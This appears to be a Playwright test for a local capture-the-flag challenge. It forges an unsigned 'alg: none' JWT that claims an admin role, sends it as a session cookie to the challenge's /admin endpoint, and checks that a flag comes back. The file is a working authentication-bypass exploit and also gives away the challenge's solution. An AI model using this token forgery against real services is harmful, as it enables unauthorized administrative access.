import { test, expect } from '@playwright/test'

const BASE_URL = 'http://localhost:5173/challenge/jwt-none-alg/'
const FLAG_REGEX = /(FLAG|CTF)\{[^}]+\}/
// alg:none bypass — forge an unsigned JWT whose header advertises `alg: none`
// and whose payload claims `role: admin`. The challenge's /admin endpoint
// trusts the header-named algorithm, so the empty-signature token is accepted.
// The forged token is delivered as the `session` cookie via the wxl runtime's
// X-Wxlsh-Cookie transport (JS cannot set the Cookie header directly).

test('jwt-none-alg is solvable via a forged alg=none admin token', async ({ page }) => {
  await page.goto(BASE_URL)
  await page.waitForFunction(
    () =>
      navigator.serviceWorker.controller !== null &&
      typeof (globalThis as { __wxlDispatch?: unknown }).__wxlDispatch === 'function',
    null,
    { timeout: 120_000 },
  )

  const flagBody = await page.evaluate(async () => {
    const b64url = (obj: unknown) =>
      btoa(JSON.stringify(obj)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')
    const header = b64url({ alg: 'none', typ: 'JWT' })
    const payload = b64url({ sub: 'attacker', role: 'admin' })
    const forged = `${header}.${payload}.` // empty signature segment

    const dispatch = (globalThis as unknown as {
      __wxlDispatch?: (req: Request) => Promise<Response>
    }).__wxlDispatch
    if (!dispatch) {
      throw new Error('__wxlDispatch not exposed on the page')
    }
    const base = 'https://challenge-jwt-none-alg.localhost'
    const req = new Request(`${base}/admin`, {
      method: 'GET',
      headers: { 'X-Wxlsh-Cookie': `session=${forged}` },
    })
    const r = await dispatch(req)
    return await r.text()
  })

  expect(flagBody).toMatch(FLAG_REGEX)
})
